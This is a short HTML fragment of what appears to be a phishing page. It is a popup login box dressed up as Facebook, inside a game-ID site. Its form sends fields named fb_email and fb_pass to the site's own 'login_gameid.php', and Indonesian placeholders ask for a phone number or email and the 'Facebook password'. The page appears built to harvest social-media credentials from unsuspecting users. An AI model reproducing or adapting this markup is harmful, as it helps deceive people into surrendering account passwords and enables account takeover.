...
<div class="popup-login" id="loginGameIdBox" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="TutupLogin()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
		...
		<div class="content-box-fb">
			...
			<form class="login-form" action="login_gameid.php" method="post">
				<label>
				<input type="text" name="fb_email" placeholder="Nomor ponsel atau alamat email" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="text" name="fb_pass" placeholder="Kata sandi Facebook" autocomplete="off" autocapitalize="off" required>
				</label>
